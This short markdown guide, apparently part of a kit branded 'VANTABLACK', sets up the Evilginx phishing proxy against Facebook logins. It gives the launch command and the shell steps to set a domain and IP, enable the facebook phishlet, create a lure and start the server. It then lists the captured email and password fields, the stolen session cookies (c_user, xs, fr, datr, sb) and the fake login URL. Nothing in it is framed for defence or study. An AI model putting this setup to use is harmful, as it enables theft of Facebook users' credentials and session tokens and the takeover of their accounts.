# Evilginx Guide for Facebook

## Enable and Launch

```bash
./bin/evilginx -p ./phishlets

# In shell:
config domain your-domain.com
config ip YOUR_IP
phishlets enable facebook
landers create facebook
server
```

## Credentials Captured

| Field | Key |
|-------|-----|
| Email | `email` |
| Password | `pass` |

## Tokens Captured

- `c_user` - User ID
- `xs` - Session token
- `fr` - Frame token
- `datr` - Browser fingerprint
- `sb` - Second browser token

## Login URL

```
https://your-domain.com/facebook/login/
```

Redirects from: www.facebook.com/login/

---

**VANTABLACK**
